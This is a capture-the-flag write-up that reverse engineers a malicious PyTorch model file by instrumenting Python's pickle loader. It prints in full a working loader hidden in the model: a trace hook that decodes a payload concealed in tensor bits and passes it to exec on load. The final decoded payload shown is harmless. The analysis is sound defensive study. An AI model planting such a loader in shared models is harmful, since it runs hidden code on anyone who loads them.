---
published: 2025-04-02
series: CyberApocalypse 2025
tags:
- AI
title: Crystal Corruption

---

This was the second Machine Learning challenge from HTB’s cyber apocalypse CTF and probably the one I enjoyed the most, in fact we are given a `resnet18.pth` and when we load it in the same way as the previous challenge we get immediately pwned, wow

```Python
Connecting to 127.0.0.1
Delivering payload to 127.0.0.1
Executing payload on 127.0.0.1
You have been pwned!
```

This is a very plausible exploit… too much plausible

Fortunately it’s just a CTF, so I started to look into `pytorch` source code and I found that `.pth` is basically just a wrapped `pickle`

I never fully understood how pickle worked until this challenge and I was amazed, it basically creates bytecode from a file and sends it to the interpreter.  
Now cool enough there is also a pure python implementation besides the C one in python.  

I replaced the default pickle class with a custom one copy-pasted from python source, I added a few prints and I discovered that an `exec` is called with the following args

```Python
import sys
import torch

def stego_decode(tensor, n=3):
    import struct
    import hashlib
    import numpy

    bits = numpy.unpackbits(tensor.view(dtype=numpy.uint8))
    payload = numpy.packbits(numpy.concatenate([numpy.vstack(tuple([bits[i::tensor.dtype.itemsize * 8] for i in range(8-n, 8)])).ravel("F")])).tobytes()
    (size, checksum) = struct.unpack("i 64s", payload[:68])
    message = payload[68:68+size]

    return message

def call_and_return_tracer(frame, event, arg):
    global return_tracer
    global stego_decode
    def return_tracer(frame, event, arg):
        if torch.is_tensor(arg):
            payload = stego_decode(arg.data.numpy(), n=3)
            if payload is not None:
                sys.settrace(None)
                exec(payload.decode("utf-8"))

    if event == "call" and frame.f_code.co_name == "_rebuild_tensor_v2":
        frame.f_trace_lines = False
        return return_tracer

sys.settrace(call_and_return_tracer)
```

It is a payload runner, so given that I am more a dymaic analysis kind of guy I actually replaced the tunner with a custom one that prints the decoded payload before evaluating it

```Python
PAYLOAD = """
import sys
import torch

def stego_decode(tensor, n=3):
    import struct
    import hashlib
    import numpy

    bits = numpy.unpackbits(tensor.view(dtype=numpy.uint8))
    payload = numpy.packbits(numpy.concatenate([numpy.vstack(tuple([bits[i::tensor.dtype.itemsize * 8] for i in range(8-n, 8)])).ravel("F")])).tobytes()
    (size, checksum) = struct.unpack("i 64s", payload[:68])
    message = payload[68:68+size]

    return message

def call_and_return_tracer(frame, event, arg):
    global return_tracer
    global stego_decode
    def return_tracer(frame, event, arg):
        if torch.is_tensor(arg):
            payload = stego_decode(arg.data.numpy(), n=3)
            if payload is not None:
                sys.settrace(None)
                print(payload)
                exec(payload.decode("utf-8"))

    if event == "call" and frame.f_code.co_name == "_rebuild_tensor_v2":
        frame.f_trace_lines = False
        return return_tracer

sys.settrace(call_and_return_tracer)"""
```

replaced pickle function loading

```Python
    def load_reduce(self):
        stack = self.stack
        args = stack.pop()
        func = stack[-1]
        if func.__name__ == 'exec':
            print(func.__name__)
            print(args)
            stack[-1] = exec(PAYLOAD)
        else:
            stack[-1] = func(*args)
```

and here we go with the decoded payload

```Python
import os
def exploit():
    connection = f"Connecting to 127.0.0.1"
    payload = f"Delivering payload to 127.0.0.1"
    result = f"Executing payload on 127.0.0.1"
    print(connection)
    print(payload)
    print(result)
    print("You have been pwned!")
hidden_flag = "HTB{n3v3r_tru5t_p1ckl3_m0d3ls}"
exploit()
```